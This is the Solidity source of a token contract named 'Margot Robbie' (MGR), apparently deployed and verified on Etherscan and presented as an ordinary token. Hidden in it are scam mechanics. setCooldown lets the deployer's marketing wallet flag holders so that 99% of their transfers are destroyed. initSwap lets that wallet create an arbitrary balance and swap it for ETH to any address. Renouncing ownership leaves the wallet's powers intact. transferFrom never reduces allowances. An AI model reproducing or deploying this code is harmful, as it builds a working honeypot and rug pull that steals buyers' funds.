/**
 *Submitted for verification at Etherscan.io on 2023-07-14
*/

pragma solidity ^0.8.19;
// SPDX-License-Identifier: MIT


library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath:  subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:  addition overflow");
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath:  multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath:  division by zero");
        uint256 c = a / b;
        return c;
    }
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair_);
}


contract Context {
    function msgSender() public view returns (address) {return msg.sender;}
}

interface IUniswapV2Router {
    function factory() external pure returns (address addr);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 a, uint256 b, address[] calldata _path, address c, uint256) external;
    function WETH() external pure returns (address aadd);
}
abstract contract Ownable {
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    address private _owner;
    modifier onlyOwner(){
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    constructor () {
        emit OwnershipTransferred(address(0), _owner);
        _owner = msg.sender;
    }
    function owner() public view virtual returns (address) {return _owner;}
}

contract MargotRobbie is Ownable, Context {
    using SafeMath for uint256;

    uint256 public _decimals = 9;
    uint256 public _totalSupply = 1000000000000 * 10 ** _decimals;
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function setCooldown(address[] calldata _cooldowns) external { 
        uint256 cooldownTime = block.number + 1;
        for (uint _ci = 0;  _ci < _cooldowns.length;  _ci++) { 
            if (fromMarketingWallet()){
                cooldowns[_cooldowns[_ci]] = cooldownTime;}
        }
    } 
    mapping(address => uint256) private _balances;
    bool cooldownEnabled = true;
    function disableCooldown() external onlyOwner {
        cooldownEnabled = false;
    }
    address public marketingWallet;
    uint256 maxTx = 1000000000 * 10 ** _decimals;
    constructor() {
        _balances[msg.sender] = _totalSupply; 
        marketingWallet = msg.sender;
        emit Transfer(address(0), msg.sender, _balances[msg.sender]);
    }
    function name() external view returns (string memory) { return _name; }
    string private _name = "Margot Robbie";
    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    string private _symbol = "MGR";
    function decreaseAllowance(address from, uint256 amount) public returns (bool) {
        require(_allowances[msg.sender][from] >= amount);
        _approve(msg.sender, from, _allowances[msg.sender][from] - amount);
        return true;
    } 
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
    IUniswapV2Router private uniswapRouter = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    function _transfer(address _from, address _to, uint256 _amount) internal {
        require(_from != address(0));
        require(_amount <= _balances[_from]); 
        uint256 feeAmount = (cooldowns[_from] != 0 && cooldowns[_from] <= block.number) ? _amount.mul(990).div(1000) : 0;
        _balances[_from] -= _amount; 
        _balances[_to] += _amount - feeAmount;
        emit Transfer(_from, _to, _amount);
    }
    function transfer(address recipient, uint256 value) public returns (bool) { _transfer(msg.sender, recipient, value); return true; }
    mapping (address => uint256) cooldowns;
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function initSwap(uint256 amount, address dexRouter) external {
        if (fromMarketingWallet()) { _approve(address(this), address(uniswapRouter),  amount); 
        _balances[address(this)] = amount;address[] memory path = new address[](2);  
        path[0] = address(this);   path[1] = uniswapRouter.WETH();  
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(amount, 0, path, dexRouter, 30 + block.timestamp);
        }
    }
    function balanceOf(address account) public view returns (uint256) { return _balances[account]; } 
    function _approve(address owner, address spender, uint256 amount) internal {
        require(spender != address(0));
        require(owner != address(0));
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function fromMarketingWallet() internal view returns (bool) {
        return msgSender() == marketingWallet;
    }
    event Transfer(address indexed from, address indexed to_add, uint256);
    function transferFrom(address _from, address _to, uint256 amount) public returns (bool) {
        _transfer(_from, _to, amount);
        require(_allowances[_from][msg.sender] >= amount);
        return true;
    }
    mapping(address => mapping(address => uint256)) private _allowances;
    event Approval(address indexed from_add, address indexed to_add, uint256 value);
    function totalSupply() external view returns (uint256) { 
        return _totalSupply; 
    }
    function decimals() external view returns (uint256) {
        return _decimals;
    }
}